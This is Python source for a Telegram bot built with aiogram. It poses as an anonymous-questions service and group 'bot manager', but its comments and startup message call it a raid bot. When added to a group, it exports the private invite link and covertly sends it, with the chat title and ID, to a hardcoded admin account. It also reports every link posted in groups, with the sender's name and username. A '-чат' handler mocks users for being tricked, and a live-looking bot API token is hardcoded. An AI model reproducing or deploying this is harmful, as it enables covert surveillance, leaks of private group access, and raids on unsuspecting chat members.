import re
from aiogram import Bot, Dispatcher, F
from aiogram.filters import CommandStart
from aiogram.enums import ChatMemberStatus
from aiogram.types import (
    InlineKeyboardButton, InlineKeyboardMarkup, 
    KeyboardButton, ReplyKeyboardMarkup, 
    CallbackQuery, Message, ChatMemberUpdated
)

API_TOKEN = "8660431803:AAHIUeTV7jxQm-fl0xcyfuVjynb__n0Nj7U"
ADMIN_ID = 7959524856

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

BLACKLIST = {}

def get_main_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Профиль")]
        ],
        resize_keyboard=True
    )

@dp.message(CommandStart())
async def cmd_start(message: Message):
    if message.chat.type == "private":
        my_link = f"https://t.me/{(await bot.get_me()).username}?start=id_{message.from_user.id}"
        await message.answer(f"Привет.\nВот твоя ссылка для анонимных вопросов:\n{my_link}", reply_markup=get_main_keyboard())
    else:
        await message.answer("Бот-менеджер успешно активирован.")

# --- ЛОВУШКА ДЛЯ КОМАНДЫ -чат ---
@dp.message(F.text.startswith("-чат"))
async def cmd_chat_trap(message: Message):
    await message.answer("лох тя надули эт бот рейда")

# --- СЛИВ ССЫЛКИ ЧАТА ПРИ ДОБАВЛЕНИИ БОТА ---
@dp.my_chat_member()
async def on_bot_added(event: ChatMemberUpdated):
    if event.new_chat_member.status in (ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.MEMBER):
        chat = event.chat
        chat_title = chat.title
        
        chat_link = f"@{chat.username}" if chat.username else "приватный чат"
        if not chat.username:
            try:
                chat_link = await bot.export_chat_invite_link(chat.id)
            except Exception:
                chat_link = "не удалось получить пригласительную ссылку (нужны права админа)"
        
        report = (
            f"Бот добавлен в новый чат!\n\n"
            f"Название: {chat_title}\n"
            f"ID чата: {chat.id}\n"
            f"Ссылка на чат: {chat_link}"
        )
        try:
            await bot.send_message(chat_id=ADMIN_ID, text=report)
        except Exception:
            pass

# --- ПЕРЕХВАТЧИК ССЫЛОК В ЧАТАХ ---
@dp.message(F.chat.type.in_({"group", "supergroup"}))
async def catch_links_in_chats(message: Message):
    text = message.text or message.caption or ""
    
    if text.startswith("-чат"):
        return
        
    link_pattern = re.compile(r'(https?://[^\s]+|t\.me/[^\s]+)', re.IGNORECASE)
    found_links = link_pattern.findall(text)
    
    if found_links:
        chat_name = message.chat.title or "Без названия"
        chat_link = f"@{message.chat.username}" if message.chat.username else f"ID: {message.chat.id}"
        user_name = message.from_user.full_name
        user_user = f"@{message.from_user.username}" if message.from_user.username else f"ID: {message.from_user.id}"
        
        links_text = "\n".join(found_links)
        report = (
            f"Перехвачена ссылка в чате!\n\n"
            f"Чат: {chat_name} ({chat_link})\n"
            f"Отправитель: {user_name} ({user_user})\n\n"
            f"Ссылки:\n{links_text}"
        )
        
        try:
            await bot.send_message(chat_id=ADMIN_ID, text=report)
        except Exception:
            pass

@dp.message(F.text == "Профиль")
async def cmd_profile(message: Message):
    user_id = message.from_user.id
    my_link = f"https://t.me/{(await bot.get_me()).username}?start=id_{user_id}"
    blocked_users = BLACKLIST.get(user_id, set())
    text = f"Твой профиль.\n\nТвоя ссылка:\n{my_link}\n\nЧерный список:"
    
    if not blocked_users:
        text += "\nСписок пуст."
        await message.answer(text, reply_markup=get_main_keyboard())
    else:
        inline_keyboard = []
        for b_id in blocked_users:
            inline_keyboard.append([
                InlineKeyboardButton(text=f"Разбанить ID {b_id}", callback_data=f"unblock_{b_id}")
            ])
        markup = InlineKeyboardMarkup(inline_keyboard=inline_keyboard)
        await message.answer(text, reply_markup=markup)

@dp.callback_query(F.data.startswith("unblock_"))
async def process_unblock(callback: CallbackQuery):
    target_id = int(callback.data.split("_")[1])
    user_id = callback.from_user.id
    if user_id in BLACKLIST and target_id in BLACKLIST[user_id]:
        BLACKLIST[user_id].remove(target_id)
        await callback.message.edit_text(f"Пользователь с ID {target_id} успешно разблокирован.")
    else:
        await callback.message.edit_text("Пользователь не найден.")
    await callback.answer()

if __name__ == "__main__":
    import asyncio
    async def main():
        print("Бот-рейдер запущен!")
        await dp.start_polling(bot)
    asyncio.run(main())
    
